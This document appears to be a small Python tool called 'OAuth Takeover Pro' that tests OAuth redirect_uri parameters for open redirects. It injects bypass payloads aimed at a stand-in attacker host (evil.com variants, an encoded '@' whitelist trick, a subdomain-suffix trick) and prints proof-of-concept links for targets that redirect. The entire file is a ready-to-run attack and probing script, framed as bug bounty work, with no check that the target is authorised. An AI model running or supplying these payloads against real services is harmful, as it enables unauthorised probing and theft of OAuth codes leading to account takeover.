import requests

print("=== OAuth Takeover Pro | Made by Uzma (Rumixyz) ===")

url = input("Paste URL with redirect_uri param: ")

payloads = [
    "https://evil.com",
    "https://evil.com%2f@whitelisted.com",
    "//evil.com",
    "https://whitelisted.com.evil.com"
]

print("\n[+] Testing for Open Redirect...\n")

for p in payloads:
    if "redirect_uri=" in url:
        test_url = url.split("redirect_uri=")[0] + "redirect_uri=" + p
    else:
        test_url = url + "&redirect_uri=" + p

    try:
        r = requests.get(test_url, allow_redirects=False, timeout=5)
        loc = r.headers.get('Location', '')
        
        if 'evil.com' in loc:
            print(f"[VULNERABLE] Payload: {p}")
            print(f"PoC Link: {test_url}\n")
        else:
            print(f"[SAFE] {p}")
    except Exception as e:
        print(f"[ERROR] {p}: {e}")

print("\nScan Done! If VULNERABLE found, report it on HackerOne.")
